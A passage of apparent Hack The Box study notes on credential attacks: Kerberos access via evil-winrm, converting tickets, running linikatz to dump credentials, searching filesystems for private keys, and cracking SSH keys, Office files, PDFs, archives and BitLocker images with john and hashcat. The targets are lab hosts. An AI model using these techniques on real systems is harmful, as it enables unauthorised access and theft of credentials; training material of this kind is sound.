    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```

- Using Evil-WinRM with Kerberos

```bash

abdeonix@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb

```

#### Miscellaneous
- If we want to use a ccache file in Windows or a kirbi file in a Linux machine, we can use [impacket-ticketConverter](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py) to convert them.

```bash
# Impacket Ticket Converter
abdeonix@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi


```

#### Linikatz

```bash
# Linikatz Download and Execution
abdeonix@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
abdeonix@htb[/htb]$ /opt/linikatz.sh


```

## Cracking Files
### Protected Files

```bash
# Hunting for Encoded Files
$ for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

```

- **Encrypted SSH Keys**
```bash
# Hunting for SSH keys
$ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

$ cat /home/cry0l1t3/.ssh/SSH.private

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC

8Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
4/OH4ENhU7qpJ62KlrnZhFX8UwYBmebNDvG12oE7i21hB/9UqZmmHktjD3+OYTsD
...SNIP...

```

- **Cracking with John**
    - We can convert many different formats into single hashes and try to crack the passwords with this.
    - There is a Python script called ssh2john.py for SSH keys, which generates the corresponding hashes for encrypted SSH keys, which we can then store in files.
```bash
$ ssh2john.py SSH.private > ssh.hash
$ cat ssh.hash 

ssh.private:$sshng$0$8$1C258238FD2D6EB0$2352$f7b...SNIP...

# Cracking ssh keys
$ john --wordlist=rockyou.txt ssh.hash

# Display the cracked hash 
$ john ssh.hash --show

```

- **Cracking Documents**
    - John provides a Python script called `office2john.py` to extract hashes from all common Office documents that can then be fed into John or Hashcat for offline cracking.

```bash
# Cracking Microsoft Office Documents
$ office2john.py Protected.docx > protected-docx.hash
$ cat protected-docx.hash

Protected.docx:$office$*2007*20*128*16*7240...SNIP...8a69cf1*98242f4da37d916305d8e2821360773b7edc481b

# Cracking 
$ john --wordlist=rockyou.txt protected-docx.hash

$ john protected-docx.hash --show

# Cracking PDFs
$ pdf2john.py PDF.pdf > pdf.hash
$ cat pdf.hash 

PDF.pdf:$pdf$2*3*128*-1028*1*16*7e88...SNIP...bd2*32*a72092...SNIP...0000*32*c48f001fdc79a030d718df5dbbdaad81d1f6fedec4a7b5cd980d64139edfcb7e

# Cracking
$ john --wordlist=rockyou.txt pdf.hash

$ john pdf.hash --show

```

### Protected Archives

```bash
# Cracking Archives
$ zip2john ZIP.zip > zip.hash
$ cat zip.hash 

ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip

$ john --wordlist=rockyou.txt zip.hash


```

- **Cracking OpenSSL Encrypted Archives**
```bash
# Using file
$ file GZIP.gzip 

GZIP.gzip: openssl encd data with salted password


# Using a for-loop to Display Extracted Contents
$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now

<SNIP>

```

- **Cracking BitLocker Encrypted Drives**
```bash
$ bitlocker2john -i Backup.vhd > backup.hashes
$ grep "bitlocker\$0" backup.hashes > backup.hash
$ cat backup.hash

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e...SNIP...70696f7eab6b

```

- The Hashcat mode for cracking BitLocker hashes is -m 22100.
```bash
# Using hashcat to Crack backup.hash

$ hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
```